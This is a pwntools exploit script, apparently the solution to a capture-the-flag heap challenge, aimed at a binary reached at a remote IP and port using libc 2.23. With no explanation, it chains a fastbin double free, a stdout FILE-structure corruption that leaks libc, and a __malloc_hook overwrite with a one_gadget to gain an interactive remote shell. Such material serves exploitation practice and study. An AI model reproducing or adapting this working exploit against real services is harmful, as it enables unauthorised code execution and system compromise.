from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice :',str(ch))
def new(size,name,content,sign=1):
	menu(1)
	p.sendlineafter("game's name:",str(size))
	p.sendafter("game's name:",name)
	if sign:
		p.sendlineafter("game's message:",content)
	else:
		p.sendline(content)
def free(index):
	menu(2)
	p.sendlineafter('index:',str(index))
	
p = process('./main')
p = remote('183.129.189.60',10031)
libc =ELF('./libc-2.23.so')
new(0x28,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
free(2)
menu(1)
p.sendlineafter("game's name:",'0'*0x500)
free(0)
new(0x60,'\xDD\x25','FMYY')
free(1)
free(3)
free(1)
new(0x60,'\x30','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'\x00'*0x33 + p64(0xFBAD1800) + p64(0)*3 + '\x88','FMYY',sign=0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
rce = libc_base + 0xF1207
free(5)
free(6)
free(5)
new(0x68,p64(malloc_hook - 0x23),'FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'\x00'*(0x13-8) + p64(rce) + p64(realloc + 4),'FMYY')
menu(1)
p.interactive()
